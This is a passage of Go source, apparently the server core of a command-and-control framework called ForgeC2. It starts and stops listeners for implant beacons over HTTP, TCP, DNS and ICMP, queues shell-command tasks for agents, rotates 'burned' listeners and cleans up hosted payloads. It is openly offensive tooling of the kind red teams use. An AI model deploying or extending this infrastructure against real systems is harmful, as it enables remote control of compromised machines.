		path := filepath.Join(dir, e.Name())
		if e.IsDir() {
			s.cleanOldFiles(path, cutoff)
			remaining, _ := os.ReadDir(path)
			if len(remaining) == 0 {
				if err := os.Remove(path); err != nil {
					slog.Debug("Failed to remove empty directory", "path", path, "err", err)
				}
			}
			continue
		}
		info, err := e.Info()
		if err != nil {
			continue
		}
		if info.ModTime().Before(cutoff) {
			if err := os.Remove(path); err != nil {
				slog.Debug("Failed to remove old file", "path", path, "err", err)
			}
		}
	}
}

func (s *Server) Shutdown() {
	slog.Info("Shutting down server...")

	// Stop accepting new connections
	s.extraListenersMu.Lock()
	for key, srv := range s.extraListeners {
		slog.Info("Shutting down extra listener", "key", key)
		srv.Close()
	}
	clear(s.extraListeners)
	s.extraListenersMu.Unlock()
	if s.tcpLn != nil {
		s.tcpLn.Close()
	}
	if s.smbLn != nil {
		s.smbLn.Close()
	}
	if s.icmpListener != nil {
		s.icmpListener.Close()
	}
	if s.dnsListener != nil {
		slog.Info("Shutting down DNS listener")
		s.dnsListener.Close()
	}
	if s.grpcListener != nil {
		slog.Info("Shutting down gRPC listener")
		s.grpcListener.Stop()
	}
	if s.httpServer != nil {
		// Wait briefly for in-flight requests to drain before forced shutdown
		done := make(chan struct{})
		go func() {
			s.inFlight.Wait()
			close(done)
		}()
		select {
		case <-done:
			slog.Info("All in-flight requests completed")
		case <-time.After(InFlightDrainTimeout):
			slog.Warn("Timed out waiting for in-flight requests, proceeding with shutdown")
		}
		shutdownCtx, cancel := context.WithTimeout(context.Background(), GracefulShutdownTimeout)
		defer cancel()
		if err := s.httpServer.Shutdown(shutdownCtx); err != nil {
			slog.Error("HTTP server shutdown error", "err", err)
		}
	}

	// Close external C2 WebSocket channels
	s.extC2ChannelsMu.Lock()
	for _, ch := range s.extC2Channels {
		if ch.Conn != nil {
			ch.Conn.Close()
		}
	}
	clear(s.extC2Channels)
	s.extC2ChannelsMu.Unlock()

	// Stop subsystems
	if s.circuitBreaker != nil {
		s.circuitBreaker.Stop()
	}
	if s.backupManager != nil {
		s.backupManager.Stop()
	}
	if s.configReloader != nil {
		s.configReloader.Stop()
	}
	if s.marketplace != nil {
		s.marketplace.StopUpdateChecker()
	}
	if s.eventManager != nil {
		s.eventManager.Shutdown()
	}

	// Signal all goroutines to stop
	if s.ctxCancel != nil {
		s.ctxCancel()
	}

	// Wait for tracked goroutines to finish
	s.wg.Wait()

	// Close database connection
	if s.db != nil {
		if sqlDB, err := s.db.DB(); err == nil {
			slog.Info("Closing database connection")
			sqlDB.Close()
		}
	}
}

func (s *Server) Run() error {
	certPath := s.cfg.Server.CertFile
	keyPath := s.cfg.Server.KeyFile

	if s.cfg.Server.TLSEnabled {
		if err := crypto.GenerateSelfSignedCert(certPath, keyPath); err != nil {
			slog.Error("Failed to generate self-signed cert", "err", err)
			return err
		}
		slog.Info("TLS certificate ready", "cert", certPath)
	}

	// start periodic cleanup
	s.wg.Add(1)
	go func() {
		defer s.wg.Done()
		s.runPeriodicCleanup()
	}()
	s.wg.Add(1)
	go func() {
		defer s.wg.Done()
		s.cleanupStaleSocks()
	}()
	s.wg.Add(1)
	go func() {
		defer s.wg.Done()
		s.periodicRPortFwdCleanup()
	}()
	s.wg.Add(1)
	go func() {
		defer s.wg.Done()
		ticker := time.NewTicker(StaleTaskRequeueInterval)
		defer ticker.Stop()
		for {
			select {
			case <-s.ctx.Done():
				return
			case <-ticker.C:
				s.requeueStaleTasks()
				s.reconcilePendingTaskCounts()
			}
		}
	}()

	// periodic metrics refresh (same interval as nav stats cache)
	s.wg.Add(1)
	go func() {
		defer s.wg.Done()
		defer func() {
			if r := recover(); r != nil {
				slog.Error("recovered from panic", "err", r, "stack", string(debug.Stack()))
			}
		}()
		ticker := time.NewTicker(5 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-s.ctx.Done():
				return
			case <-ticker.C:
				s.updateMetricsFromDB()
			}
		}
	}()

	// Initialize Circuit Breaker
	s.circuitBreaker = NewCircuitBreaker(s.cfg)
	s.circuitBreaker.SetOnBurnedHandler(func(targetID string) {
		slog.Warn("Circuit breaker triggered: listener BURNED", "listener_id", targetID)
		// Automatically push profile rotation to agents on this listener
		s.rotateAgentsOnBurnedListener(targetID)
	})
	s.circuitBreaker.Start()

	// start update checker
	s.initUpdateChecker()

	// periodic cleanup of hosted one-liner payloads
	s.wg.Add(1)
	go func() {
		defer s.wg.Done()
		defer func() {
			if r := recover(); r != nil {
				slog.Error("Payload cleanup panicked", "recover", r)
			}
		}()
		ticker := time.NewTicker(PayloadCleanupInterval)
		defer ticker.Stop()
		for {
			select {
			case <-s.ctx.Done():
				return
			case <-ticker.C:
				s.cleanupOldPayloads()
			}
		}
	}()

	// Start TCP transport layer if enabled (high priority feature)
	if s.cfg.Server.TCPEnabled && s.cfg.Server.TCPAddr != "" {
		s.wg.Add(1)
		go func() {
			defer s.wg.Done()
			s.startTCPListener()
		}()
	}
	if s.cfg.Server.SMBEnabled && s.cfg.Server.SMBPipe != "" {
		s.wg.Add(1)
		go func() {
			defer s.wg.Done()
			s.startSMBListener()
		}()
	}

	// Start ICMP C2 listener if enabled
	if s.cfg.Server.ICMPEnabled {
		il := NewICMPBeaconListener(s.cfg.Server.ICMPAddr)
		il.SetHandler(s.makeBeaconHandler())
		if err := il.Start(); err != nil {
			slog.Error("Failed to start ICMP listener", "err", err)
		}
		s.icmpListener = il
	}

	// Start DNS C2 listener if enabled
	if s.cfg.Server.DNSEnabled && s.cfg.Server.DNSDomain != "" {
		dl := NewDNSBeaconListener(s.cfg.Server.DNSDomain, s.cfg.Server.Host, 0, s.cfg.Server.DNSAddr)
		dl.SetHandler(s.makeBeaconHandler())
		s.dnsListener = dl
		s.wg.Add(1)
		go func() {
			defer s.wg.Done()
			dl.Start()
		}()
	}

	// Start gRPC transport layer if enabled
	if s.cfg.Server.GRPCEnabled && s.cfg.Server.GRPCAddr != "" {
		s.wg.Add(1)
		go func() {
			defer s.wg.Done()
			s.startGRPCListener()
		}()
	}

	// Auto-generate ExtC2 token if empty
	if s.cfg.RateLimit.ExtC2.APIToken == "" {
		tokenBytes := make([]byte, 32)
		if _, err := rand.Read(tokenBytes); err == nil {
			s.cfg.RateLimit.ExtC2.APIToken = hex.EncodeToString(tokenBytes)
			if err := s.cfg.Save(s.configPath); err == nil {
				slog.Info("Auto-generated ExtC2 API token")
			}
		}
	}

	// Restore External C2 channels from DB
	s.restoreExtC2Channels()

	// Start async build job cleanup goroutine
	s.wg.Add(1)
	go func() {
		defer s.wg.Done()
		s.cleanupBuildJobs()
	}()

	// Start extra listeners from DB (created via the UI in previous sessions)
	s.startExtraListenersFromDB()

	// Check main server port availability before attempting to bind
	addr := s.cfg.Server.Host + ":" + itoa(s.cfg.Server.Port)
	if !isPortAvailable(s.cfg.Server.Host, s.cfg.Server.Port) {
		return fmt.Errorf("port %s is already in use — check for another server instance or change server.port in config.yaml", addr)
	}

	slog.Info("Starting ForgeC2 server", "addr", addr, "tls", s.cfg.Server.TLSEnabled)

	s.httpServer = s.newHTTPServer(addr)
	if s.cfg.Server.TLSEnabled {
		if err := s.configureTLS(s.httpServer); err != nil {
			return err
		}
		return s.httpServer.ListenAndServeTLS(certPath, keyPath)
	}
	return s.httpServer.ListenAndServe()
}

// startExtraListenersFromDB starts extra listeners for all enabled listeners
// stored in the database. Called at server startup.
func (s *Server) startExtraListenersFromDB() {
	var listeners []db.Listener
	// Load all enabled listeners (DNS/ICMP are loaded from DB too now)
	if err := s.db.Find(&listeners, "enabled = ?", true).Error; err != nil {
		slog.Error("Failed to load listeners from DB", "err", err)
		return
	}
	for _, l := range listeners {
		scheme := l.Scheme
		if scheme == "" {
			scheme = l.Type
		}
		key := listenerKey(&l)

		// For HTTP/TCP, skip if this is the main server address
		if scheme == "http" || scheme == "https" || scheme == "tcp" || scheme == "tls" {
			addr := l.Host + ":" + itoa(l.Port)
			mainAddr := s.cfg.Server.Host + ":" + itoa(s.cfg.Server.Port)
			if addr == mainAddr {
				slog.Debug("Skipping extra listener — matches main server address", "key", key)
				continue
			}
			// Check port availability
			if !isPortAvailable(l.Host, l.Port) {
				slog.Warn("Port not available for extra listener, skipping", "key", key, "addr", addr)
				continue
			}
		}

		slog.Info("Restoring extra listener from DB", "key", key, "scheme", scheme)
		if err := s.startExtraListener(key, scheme); err != nil {
			slog.Error("Failed to start extra listener from DB", "key", key, "err", err)
		}
	}
}

// makeBeaconHandler creates a closure that wraps processBeacon for listener callbacks.
func (s *Server) makeBeaconHandler() func(string, []byte) []byte {
	return func(agentID string, reqJSON []byte) []byte {
		var req beaconRequest
		if len(reqJSON) > 0 {
			if err := json.Unmarshal(reqJSON, &req); err != nil {
				slog.Error("Beacon handler unmarshal error", "err", err)
			}
		}
		if req.UUID == "" {
			req.UUID = agentID
		}
		resp := s.processBeacon(req, "")
		respJSON, ok := marshalJSONSafe(resp)
		if !ok {
			return nil
		}
		return respJSON
	}
}

// startExtraListener starts an additional listener for the given scheme and key.
func (s *Server) startExtraListener(key, scheme string) error {
	s.extraListenersMu.Lock()
	if len(s.extraListeners) >= MaxExtraListeners {
		s.extraListenersMu.Unlock()
		return fmt.Errorf("extra listener limit reached (%d)", MaxExtraListeners)
	}
	s.extraListenersMu.Unlock()

	switch scheme {
	case "http", "https":
		return s.startExtraHTTPListener(key, scheme)
	case "tcp", "tls":
		return s.startExtraTCPListener(key, scheme)
	case "dns":
		return s.startExtraDNSListener(key)
	case "icmp":
		return s.startExtraICMPListener(key)
	default:
		slog.Warn("Unknown extra listener scheme, skipping", "scheme", scheme, "key", key)
		return nil
	}
}

func (s *Server) startExtraHTTPListener(key, scheme string) error {
	// Key format: "http://host:port" or "https://host:port"
	addr := key[len(scheme)+3:] // strip "scheme://"
	srv := &http.Server{
		Addr:              addr,
		Handler:           s.router,
		ReadTimeout:       HTTPReadTimeout,
		ReadHeaderTimeout: 10 * time.Second,
		WriteTimeout:      HTTPWriteTimeout,
		IdleTimeout:       HTTPIdleTimeout,
	}
	s.extraListenersMu.Lock()
	s.extraListeners[key] = srv
	s.extraListenersMu.Unlock()
	s.wg.Add(1)
	go func() {
		defer func() {
			if r := recover(); r != nil {
				slog.Error("recovered from panic", "err", r, "stack", string(debug.Stack()))
			}
		}()
		defer s.wg.Done()
		var err error
		if scheme == "https" {
			slog.Info("Extra HTTPS listener started", "addr", addr, "key", key)
			err = srv.ListenAndServeTLS(s.cfg.Server.CertFile, s.cfg.Server.KeyFile)
		} else {
			slog.Info("Extra HTTP listener started", "addr", addr, "key", key)
			err = srv.ListenAndServe()
		}
		if err != nil && err != http.ErrServerClosed {
			slog.Error("Extra HTTP listener error", "key", key, "addr", addr, "err", err)
		}
		s.extraListenersMu.Lock()
		delete(s.extraListeners, key)
		s.extraListenersMu.Unlock()
	}()
	return nil
}

func (s *Server) startExtraTCPListener(key, scheme string) error {
	// Key format: "tcp://host:port" or "tls://host:port"
	addr := key[len(scheme)+3:] // strip "scheme://"
	var ln net.Listener
	var err error
	if scheme == "tls" {
		cert, certErr := tls.LoadX509KeyPair(s.cfg.Server.CertFile, s.cfg.Server.KeyFile)
		if certErr != nil {
			return fmt.Errorf("loading TLS cert for extra TCP listener: %w", certErr)
		}
		tlsCfg := &tls.Config{
			Certificates: []tls.Certificate{cert},
			MinVersion:   tls.VersionTLS12,
		}
		ln, err = tls.Listen("tcp", addr, tlsCfg)
	} else {
		ln, err = net.Listen("tcp", addr)
	}
	if err != nil {
		return fmt.Errorf("starting extra TCP listener: %w", err)
	}

	s.extraListenersMu.Lock()
	s.extraListeners[key] = ln
	s.extraListenersMu.Unlock()

	slog.Info("Extra TCP listener started", "addr", addr, "key", key, "tls", scheme == "tls")
	s.wg.Add(1)
	go func() {
		defer func() {
			if r := recover(); r != nil {
				slog.Error("recovered from panic", "err", r, "stack", string(debug.Stack()))
			}
		}()
		defer s.wg.Done()
		for {
			conn, aErr := ln.Accept()
			if aErr != nil {
				break
			}
			s.wg.Add(1)
			go func() {
				defer s.wg.Done()
				s.handleTCPConnection(conn)
			}()
		}
		ln.Close()
		s.extraListenersMu.Lock()
		delete(s.extraListeners, key)
		s.extraListenersMu.Unlock()
	}()
	return nil
}

func (s *Server) startExtraDNSListener(key string) error {
	// Key format: "dns://domain" — we need to look up the listener record for full config
	var l db.Listener
	if err := s.db.Where("scheme = ? AND dns_domain = ?", "dns", key[6:]).First(&l).Error; err != nil {
		return fmt.Errorf("DNS listener record not found for domain %s: %w", key[6:], err)
	}
	addr := l.DNSListenAddr
	if addr == "" {
		addr = s.cfg.Server.DNSAddr
	}
	if addr == "" {
		addr = ":53"
	}

	dl := NewDNSBeaconListener(l.DNSDomain, l.Host, l.ID, addr)
	dl.SetHandler(s.makeBeaconHandler())

	s.extraListenersMu.Lock()
	s.extraListeners[key] = dl
	s.extraListenersMu.Unlock()

	s.wg.Add(1)
	go func() {
		defer s.wg.Done()
		dl.Start()
	}()

	slog.Info("Extra DNS listener started", "domain", l.DNSDomain, "addr", addr)
	return nil
}

func (s *Server) startExtraICMPListener(key string) error {
	// Key format: "icmp://addr" — we need to look up the listener record for full config
	var l db.Listener
	addrPart := key[7:] // strip "icmp://"
	if err := s.db.Where("scheme = ? AND icmp_addr = ?", "icmp", addrPart).First(&l).Error; err != nil {
		return fmt.Errorf("ICMP listener record not found for addr %s: %w", addrPart, err)
	}
	addr := l.ICMPAddr
	if addr == "" {
		addr = addrPart
	}

	il := NewICMPBeaconListener(addr)
	il.SetHandler(s.makeBeaconHandler())

	if err := il.Start(); err != nil {
		return fmt.Errorf("starting extra ICMP listener: %w", err)
	}

	s.extraListenersMu.Lock()
	s.extraListeners[key] = il
	s.extraListenersMu.Unlock()

	slog.Info("Extra ICMP listener started", "addr", addr)
	return nil
}

// stopExtraListener gracefully stops an extra listener by key.
func (s *Server) stopExtraListener(key string) error {
	s.extraListenersMu.Lock()
	closer, ok := s.extraListeners[key]
	delete(s.extraListeners, key)
	s.extraListenersMu.Unlock()
	if !ok {
		return nil
	}
	return closer.Close()
}

func (s *Server) runPeriodicCleanup() {
	s.cleanupOldData()
	ticker := time.NewTicker(PeriodicCleanupInterval)
	defer ticker.Stop()

	for {
		select {
		case <-s.ctx.Done():
			return
		case <-ticker.C:
			s.cleanupOldData()
		}
	}
}

func (s *Server) periodicRPortFwdCleanup() {
	ticker := time.NewTicker(RPortFwdCleanupInterval)
	defer ticker.Stop()

	for {
		select {
		case <-s.ctx.Done():
			return
		case <-ticker.C:
			s.cleanupStaleRPortFwd()
		}
	}
}

// requeueStaleTasks retries only tasks whose delivery was never acknowledged.
// Acknowledged tasks may still be executing and must never be dispatched twice.
func (s *Server) requeueStaleTasks() {
	cutoff := time.Now().Add(-StaleRunningTaskTimeout)
	var staleTasks []db.Task
	if err := s.db.Where("status = ? AND claimed_at < ? AND acknowledged_at IS NULL", "running", cutoff).Limit(1000).Find(&staleTasks).Error; err != nil {
		slog.Error("Failed to find stale running tasks", "error", err)
		return
	}
	if len(staleTasks) == 0 {
		return
	}
	taskIDs := make([]uint, len(staleTasks))
	for i, t := range staleTasks {
		taskIDs[i] = t.ID
	}
	if err := s.db.Model(&db.Task{}).Where("id IN ?", taskIDs).
		Updates(map[string]interface{}{"status": "pending", "claimed_by": "", "claimed_at": time.Time{}}).Error; err != nil {
		slog.Error("Failed to requeue stale running tasks", "count", len(taskIDs), "error", err)
		return
	}
	slog.Info("Requeued stale running tasks to pending", "count", len(staleTasks))
}

// reconcilePendingTaskCounts recomputes the in-memory pending task counter
// from the DB to fix any drift caused by unusual task completion paths.
func (s *Server) reconcilePendingTaskCounts() {
	var results []struct {
		AgentID string
		Count   int
	}
	if err := s.db.Model(&db.Task{}).
		Select("agent_id, COUNT(*) as count").
		Where("status IN ?", []string{"pending", "running"}).
		Group("agent_id").
		Find(&results).Error; err != nil {
		slog.Error("Failed to reconcile pending task counts", "error", err)
		return
	}
	s.agentPendingTasksMu.Lock()
	clear(s.agentPendingTasks)
	for _, r := range results {
		s.agentPendingTasks[r.AgentID] = r.Count
	}
	s.agentPendingTasksMu.Unlock()
}

func itoa(i int) string {
	return strconv.Itoa(i)
}

// isPortAvailable checks whether the given host:port can be listened on.
func isPortAvailable(host string, port int) bool {
	addr := host + ":" + itoa(port)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return false
	}
	ln.Close()
	return true
}

// startTCPListener starts a raw TCP transport listener for agents using Protocol=tcp.
// Uses length-prefixed JSON (4-byte BE len + JSON) for BeaconRequest / BeaconResponse.
func (s *Server) startTCPListener() {
	ln, err := net.Listen("tcp", s.cfg.Server.TCPAddr)
	if err != nil {
		slog.Error("Failed to start TCP listener", "addr", s.cfg.Server.TCPAddr, "err", err)
		return
	}
	s.tcpLn = ln
	slog.Info("TCP transport layer listening", "addr", s.cfg.Server.TCPAddr)

	for {
		conn, err := ln.Accept()
		if err != nil {
			select {
			case <-s.ctx.Done():
				return
			default:
				slog.Error("TCP accept error", "addr", s.cfg.Server.TCPAddr, "err", err)
				continue
			}
		}
		go s.handleTCPConnection(conn)
	}
}

func (s *Server) handleTCPConnection(conn net.Conn) {
	defer conn.Close()
	slog.Info("TCP agent connected", "remote", conn.RemoteAddr().String())

	for {
		conn.SetReadDeadline(time.Now().Add(TCPReadDeadline))

		// Read length prefix (big endian uint32)
		var msgLen uint32
		if err := binary.Read(conn, binary.BigEndian, &msgLen); err != nil {
			return
		}
		if msgLen == 0 || msgLen > TCPMaxMessageSize {
			return
		}

		buf := make([]byte, msgLen)
		if _, err := io.ReadFull(conn, buf); err != nil {
			return
		}

		var req beaconRequest
		if err := json.Unmarshal(buf, &req); err != nil {
			slog.Error("TCP bad beacon json", "err", err)
			return
		}

		resp := s.processBeacon(req, "")

		respBytes, ok := marshalJSONSafe(resp)
		if !ok {
			return
		}
		if err := binary.Write(conn, binary.BigEndian, uint32(len(respBytes))); err != nil {
			return
		}
		if _, err := conn.Write(respBytes); err != nil {
			return
		}
	}
}

// ActivityMiddleware updates user's LastActivity timestamp on each request (throttled to 60s)
func (s *Server) ActivityMiddleware() gin.HandlerFunc {
	var mu sync.Mutex
	lastUpdated := make(map[uint]time.Time)

	s.wg.Add(1)
	go func() {
		defer s.wg.Done()
		ticker := time.NewTicker(ActivityCleanupInterval)
		defer ticker.Stop()
		for {
			select {
			case <-s.ctx.Done():
				return
			case <-ticker.C:
				cutoff := time.Now().Add(-ActivityCleanupInterval)
				mu.Lock()
				for uid, t := range lastUpdated {
					if t.Before(cutoff) {
						delete(lastUpdated, uid)
					}
				}
				mu.Unlock()
			}
		}
	}()

	return func(c *gin.Context) {
		userID, exists := c.Get("user_id")
		if !exists {
			c.Next()
			return
		}
		uid, ok := userID.(uint)
		if !ok {
			c.Next()
			return
		}
		now := time.Now()
		mu.Lock()
		last := lastUpdated[uid]
		if now.Sub(last) < ActivityUpdateThrottle {
			mu.Unlock()
			c.Next()
			return
		}
		lastUpdated[uid] = now
		mu.Unlock()
		go func() {
			ctx, cancel := context.WithTimeout(s.ctx, 5*time.Second)
			defer cancel()
			s.db.WithContext(ctx).Model(&db.User{}).Where("id = ?", uid).Update("last_activity", now)
		}()
		c.Next()
	}
}

// getAgentOrFail fetches agent by ID. On failure writes JSON 404 and returns false.
func (s *Server) getAgentOrFail(c *gin.Context, id string) (db.Implant, bool) {
	var agent db.Implant
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		slog.Error("Agent not found", "agent_id", id, "error", err)
		respondError(c, http.StatusNotFound, "agent not found")
		return agent, false
	}
	return agent, true
}

// createTask creates and persists a new pending task. Returns the task or error.
func (s *Server) createTask(agentID, taskType, command, shell, path, data string, offset, size int64) (*db.Task, error) {
	// Validate task type against the registry
	if !IsKnownTaskType(taskType) && !protocol.ValidTaskType(taskType) {
		return nil, fmt.Errorf("unknown task type: %s", taskType)
	}

	// Validate required parameters from the registry metadata
	if info, ok := getTaskTypeInfo(taskType); ok {
		for _, p := range info.Parameters {
			if p.Required {
				switch p.Name {
				case "command":
					if command == "" {
						return nil, fmt.Errorf("task type %s requires 'command' parameter", taskType)
					}
				case "shell":
					if shell == "" {
						return nil, fmt.Errorf("task type %s requires 'shell' parameter", taskType)
					}
				case "path":
					if path == "" {
						return nil, fmt.Errorf("task type %s requires 'path' parameter", taskType)
					}
				case "data":
					if data == "" {
						return nil, fmt.Errorf("task type %s requires 'data' parameter", taskType)
					}
				}
			}
		}
	}

	// Per-agent task queue depth limit — prevents a single compromised agent from flooding the queue
	s.agentPendingTasksMu.Lock()
	pending := s.agentPendingTasks[agentID]
	if pending >= MaxPendingTasksPerAgent {
		s.agentPendingTasksMu.Unlock()
		return nil, fmt.Errorf("agent %s has %d pending tasks (limit %d)", agentID, pending, MaxPendingTasksPerAgent)
	}
	s.agentPendingTasks[agentID] = pending + 1
	s.agentPendingTasksMu.Unlock()

	task := db.Task{
		AgentID: agentID,
		Type:    taskType,
		Command: command,
		Shell:   shell,
		Path:    path,
		Data:    data,
		Offset:  offset,
		Size:    size,
		Status:  "pending",
	}
	if err := s.db.Create(&task).Error; err != nil {
		s.agentPendingTasksMu.Lock()
		s.agentPendingTasks[agentID]--
		s.agentPendingTasksMu.Unlock()
		return nil, err
	}
	if s.pluginManager != nil {
		s.wg.Add(1)
		go func() {
			defer s.wg.Done()
			s.pluginManager.ExecuteHook(s.ctx, plugin.Event{
				Type:      plugin.EventTaskCreated,
				Timestamp: time.Now(),
				AgentID:   agentID,
				Payload: map[string]interface{}{
					"task_id":   task.ID,
					"task_type": taskType,
					"command":   command,
				},
			})
		}()
	}
	s.metrics.TasksTotal.Inc()
	return &task, nil
}

// dispatchTask logs the audit action, broadcasts the update via WS, and returns success JSON.
// Sets CreatedBy from the authenticated user in context.
func (s *Server) dispatchTask(c *gin.Context, task *db.Task, auditAction, details string) {
	// Set task attribution from context
	user, _ := c.Get("user")
	if username, ok := user.(string); ok && username != "" && task.CreatedBy == "" {
		task.CreatedBy = username
		s.db.Model(task).Update("created_by", username)
	}
	s.LogAuditRecord(c, auditAction, "agent", task.AgentID, details, true, nil)
	s.broadcastTaskUpdate(task.AgentID, *task)
	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
}

// handleHealthCheck provides health/ready endpoints for monitoring
func (s *Server) handleHealthCheck(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{
		"status":  "ok",
		"version": ServerVersion,
		"uptime":  time.Since(s.startTime).String(),
	})
}
